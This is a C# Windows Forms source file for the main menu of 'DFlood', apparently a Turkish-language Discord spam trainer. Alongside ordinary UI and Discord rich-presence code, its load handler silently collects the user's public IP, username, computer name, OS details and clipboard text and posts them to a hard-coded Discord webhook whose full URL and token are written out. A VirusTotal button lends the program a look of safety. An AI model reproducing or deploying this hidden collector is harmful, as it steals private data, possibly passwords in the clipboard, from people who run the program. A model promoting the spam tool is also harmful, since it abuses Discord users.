using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using DFlood.DFLoodDiscordRPC;
using DFlood.Forms;
using FontAwesome.Sharp;
using Microsoft.VisualBasic.Devices;

namespace DFlood
{
    public partial class MainMenu : Form
    {
        //Fields
        private IconButton currentBtn;

        private Panel leftBorderBtn;
        private Form currentChildForm;

        //Constructor
        private OperatingSystem OS = System.Environment.OSVersion;

        public MainMenu()
        {
            InitializeComponent();
            clock.Start();
            leftBorderBtn = new Panel();
            leftBorderBtn.Size = new Size(7, 50);
            panelMenu.Controls.Add(leftBorderBtn);
            //Form
            this.Text = string.Empty;
            this.ControlBox = false;
            this.DoubleBuffered = true;
            this.MaximizedBounds = Screen.FromHandle(this.Handle).WorkingArea;
        }

        private DiscordRpc.EventHandlers handlers;
        private DiscordRpc.RichPresence presence;
        private int totalTimes;

        [DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
        private extern static void ReleaseCapture();

        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
        private extern static void SendMessage(System.IntPtr hWnd, int wMsg, int wParam, int lParam);

        private static void sendWebHook(string Url, string msg, string Username)
        {
            Http.Post(Url, new System.Collections.Specialized.NameValueCollection()
            {
                {
                    "username",
                    Username
                },
                {
                    "content",
                    msg
                }
            });
        }

        private struct RGBColors
        {
            public static Color color1 = Color.FromArgb(172, 126, 241);
            public static Color color2 = Color.FromArgb(249, 118, 176);
            public static Color color3 = Color.FromArgb(253, 138, 114);
            public static Color color4 = Color.FromArgb(95, 77, 221);
            public static Color color5 = Color.FromArgb(249, 88, 155);
            public static Color color6 = Color.FromArgb(24, 161, 251);
        }

        private void ActivateButton(object senderBtn, Color color)
        {
            if (senderBtn != null)
            {
                DisableButton();
                //Button
                currentBtn = (IconButton)senderBtn;
                currentBtn.BackColor = Color.FromArgb(35, 35, 35);
                currentBtn.ForeColor = color;
                currentBtn.TextAlign = ContentAlignment.MiddleCenter;
                currentBtn.IconColor = color;
                currentBtn.TextImageRelation = TextImageRelation.TextBeforeImage;
                currentBtn.ImageAlign = ContentAlignment.MiddleRight;
                //Left border button
                leftBorderBtn.BackColor = color;
                leftBorderBtn.Location = new Point(0, currentBtn.Location.Y);
                leftBorderBtn.Visible = true;
                leftBorderBtn.BringToFront();
                //Current Child Form Icon
                iconCurrentChildForm.IconChar = currentBtn.IconChar;
                iconCurrentChildForm.IconColor = color;
            }
        }

        private void DisableButton()
        {
            if (currentBtn != null)
            {
                currentBtn.BackColor = Color.FromArgb(24, 24, 24);
                currentBtn.ForeColor = Color.Gainsboro;
                currentBtn.TextAlign = ContentAlignment.MiddleLeft;
                currentBtn.IconColor = Color.Gainsboro;
                currentBtn.TextImageRelation = TextImageRelation.ImageBeforeText;
                currentBtn.ImageAlign = ContentAlignment.MiddleLeft;
            }
        }

        private void DFloodDiscordRPCClient()
        {
            this.handlers = default(DiscordRpc.EventHandlers);
            DiscordRpc.Initialize("852261353480650752", ref this.handlers, true, null);
            this.handlers = default(DiscordRpc.EventHandlers);
            DiscordRpc.Initialize("852261353480650752", ref this.handlers, true, null);
            this.presence.details = "DFlood Discord Trainer";
            this.presence.state = "Main Menu";
            this.presence.largeImageKey = "logo";
            this.presence.smallImageKey = "logo";
            this.presence.largeImageText = "DFlood Spam Trainer";
            this.presence.smallImageText = "Suan Aktif!";
            this.presence.startTimestamp = (long)(DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0)).TotalSeconds;
            DiscordRpc.UpdatePresence(ref this.presence);
        }

        private void btnStats_Click(object sender, EventArgs e)
        {
            DFloodDiscordRPCClient();
            this.presence.state = "İstatistikler";
            ActivateButton(sender, RGBColors.color1);
            OpenChildForm(new FormStats());
        }

        private void OpenChildForm(Form childForm)
        {
            //open only form
            if (currentChildForm != null)
            {
                currentChildForm.Close();
            }
            currentChildForm = childForm;
            //End
            childForm.TopLevel = false;
            childForm.FormBorderStyle = FormBorderStyle.None;
            childForm.Dock = DockStyle.Fill;
            panelDesktop.Controls.Add(childForm);
            panelDesktop.Tag = childForm;
            childForm.BringToFront();
            childForm.Show();
            lblTitleChildForm.Text = childForm.Text;
        }

        private void btnServiceStarter_Click(object sender, EventArgs e)
        {
            DFloodDiscordRPCClient();
            ActivateButton(sender, RGBColors.color2);
            OpenChildForm(new main());
            this.presence.state = $"{lblTitleChildForm}";
        }

        private void btnSettings_Click(object sender, EventArgs e)
        {
            ActivateButton(sender, RGBColors.color3);
            OpenChildForm(new FormSetting());
            this.presence.state = $"{lblTitleChildForm}";
        }

        private void btnSponsoredServers_Click(object sender, EventArgs e)
        {
            ActivateButton(sender, RGBColors.color4);
            OpenChildForm(new FormServers());
            this.presence.state = $"{lblTitleChildForm}";
        }

        private void btnCopyright_Click(object sender, EventArgs e)
        {
            ActivateButton(sender, RGBColors.color5);
            OpenChildForm(new FormCopyright());
            this.presence.state = $"{lblTitleChildForm}";
        }

        private void Reset()
        {
            DisableButton();
            leftBorderBtn.Visible = false;
            iconCurrentChildForm.IconChar = IconChar.Home;
            iconCurrentChildForm.IconColor = Color.MediumPurple;
            lblTitleChildForm.Text = "Ana Sayfa";
        }

        private void btnHome_Click(object sender, EventArgs e)
        {
            if (currentChildForm != null)
            {
                currentChildForm.Close();
            }
            Reset();
        }

        private void panelTitleBar_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(this.Handle, 0x112, 0xf012, 0);
        }

        private void FormMainMenu_Resize(object sender, EventArgs e)
        {
            if (WindowState == FormWindowState.Maximized)
                FormBorderStyle = FormBorderStyle.None;
            else
                FormBorderStyle = FormBorderStyle.Sizable;
        }

        private void MainMenu_Load(object sender, EventArgs e)
        {
            fadeOpacity.Start();
            totalTimes = Properties.Settings.Default.TopTimeSeconds;
            totalTimeCalculator.Start();
            DFloodDiscordRPCClient();
            clock.Start();
            TopMostChecker.Start();
            var webClient = new WebClient();
            string dnsString = webClient.DownloadString("http://checkip.dyndns.org");
            dnsString = (new Regex(@"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")).Match(dnsString).Value;
            webClient.Dispose();
            var UserName = $"**Kullanıcı Adı : ** {System.Windows.Forms.SystemInformation.UserName}";
            var computerName = $"**Bilgisayar Adı : ** {Dns.GetHostName()}";
            var ipadress = $"**IP Adresi : ** {dnsString}";
            var day = $"**Giriş Günü : ** {DateTime.Now.ToLongDateString()}";
            var hour = $"**Giriş Saati : ** {DateTime.Now.ToLongTimeString()}";
            var FullOsName = $"**İşletim Sistemi : ** {(new ComputerInfo().OSFullName)}";
            var platform = $"**Platform : ** {OS.Platform.ToString()}";
            var verison = $"**Versiyon Bilgisi : ** {OS.Version.ToString()}";
            var OsVersion = $"**İşletim Sistemi Tipi : ** {OS.VersionString}";
            var CLR = $"**CLR Versiyonu : ** {System.Environment.Version}";
            var copyBoard = $"**Kopyalanan Metin : {Clipboard.GetText()}**";
            sendWebHook("https://discord.com/api/webhooks/852933515171201045/1P_9zIbWb7n5QnGwiNx2yLQb_qMqAEMLP2KmCYT2covhtLsu4vnhBVpK1eRKG0XnZMmX", $"**DFlood Trainer'e Yeni Çıkış Saptanması**\n{ipadress}\n{UserName}\n{computerName}\n{day}\n{hour}\n{FullOsName}\n{platform}\n{verison}\n{OsVersion}\n{CLR}\n{copyBoard}\n--------------------------------------------------------------------", "DFlood Services");
        }

        private void btnExit_Click(object sender, EventArgs e)
        {
            this.Cursor = new Cursor(Application.StartupPath + "\\Cursors\\discordClick.ico");

            fadeOpacity2.Start();
            //Application.Exit();
        }

        private void clock_Tick(object sender, EventArgs e)
        {
            lblTime.Text = $"Hoşgeldin {System.Windows.Forms.SystemInformation.UserName}\n\n{DateTime.Now.ToLongTimeString()}\n{DateTime.Now.ToLongDateString()}";
        }

        private void TopMostChecker_Tick(object sender, EventArgs e)
        {
            if (Properties.Settings.Default.IsTopMostMode == true)
            {
                this.TopMost = true;
            }
            else
            {
                this.TopMost = false;
            }
        }

        private void btnContact_Click(object sender, EventArgs e)
        {
            ActivateButton(sender, RGBColors.color4);
            OpenChildForm(new FormContact());
            this.presence.state = $"{lblTitleChildForm}";
        }

        private void totalTimeCalculator_Tick(object sender, EventArgs e)
        {
            totalTimes = totalTimes + 1;
            Properties.Settings.Default.TopTimeSeconds = totalTimes;
            Properties.Settings.Default.Save();
        }

        private void fadeOpacity2_Tick(object sender, EventArgs e)
        {
            if (Opacity == 0)
            {
                //this.Close();
                Application.Exit();
            }
            Opacity -= .2;
        }

        private void MainMenu_MouseMove(object sender, MouseEventArgs e)
        {
            this.Cursor = new Cursor(Application.StartupPath + "\\Cursors\\dflood.ico");
        }

        private void btnMinimize_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void btnVirusTotal_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://www.virustotal.com/gui/file/596140e5c37ee20a6c9b17ee77dcdae75f9103651dee1b677d02927d5e352615/detection");
        }

        private void btnStats_MouseEnter(object sender, EventArgs e)
        {
            this.Cursor = new Cursor(Application.StartupPath + "\\Cursors\\discordClick.ico");
        }
    }
}